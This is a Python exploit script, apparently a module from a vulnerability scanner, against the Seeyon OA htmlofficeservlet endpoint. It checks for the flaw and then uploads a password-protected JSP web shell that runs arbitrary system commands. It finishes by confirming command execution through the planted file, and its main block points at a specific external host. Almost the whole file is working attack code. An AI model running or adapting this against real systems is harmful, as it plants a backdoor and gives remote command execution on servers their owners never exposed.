#!/usr/bin/env python3

'''
name: seeyou漏洞
description: seeyou漏洞可执行任意命令
'''

from app.lib.utils.request import request

class See_Yon_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
        }
        self.payload = '''
                   DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV 
                   OPTION=S3WYOSWLBSGr currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66 CREATEDATE=wUghPB3szB3Xwg66 
                   RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6 originalFileId=wV66 originalCreateDate=wUghPB3szB3Xwg66 
                   FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6 
                   needReadFile=yRWZdAS6 originalCreateDate=wLSGP4oEzLKAz4=iz=66 
                   <%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
                   <%!p ublic static String excuteCmd(String c) {StringBuilder line = new StringBuilder(); 
                   try {Process pro = Runtime.getRuntime().exec(c);
                   BufferedReader buf = new BufferedR eader(new InputStreamReader(pro.getInputStream()));
                   String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}
                   buf.close();} catch (Exceptio n e) {line.append(e.getMessage());}return line.toString();} %>
                   <%if("asasd3344".equ als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd")))
                   {out.pri ntln("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce                  
                '''


    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.get(self.url + "/seeyon/htmlofficeservlet", headers = self.headers)
            if check_req.status_code == 200 and "DBSTEP V3.0     0               21              0               htmoffice operate err" in check_req.text :
                print("存在seeyou漏洞")
                jsp__req = request.post(self.url + "/seeyon/htmlofficeservlet", data = self.payload, headers = self.headers)
                cmd_req = request.get(self.url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=echo asasd3344", headers = self.headers)
                if cmd_req.status_code == 200 and "asasd3344" in cmd_req.text:
                    print("上传的jsp文件路径为:", self.url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=echo asasd3344")
                    return True
            else:
                print("不存在seeyou漏洞")
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    See_yon = See_Yon_BaseVerify('http://a6p.seeyon.com:8005')
    See_yon.run()


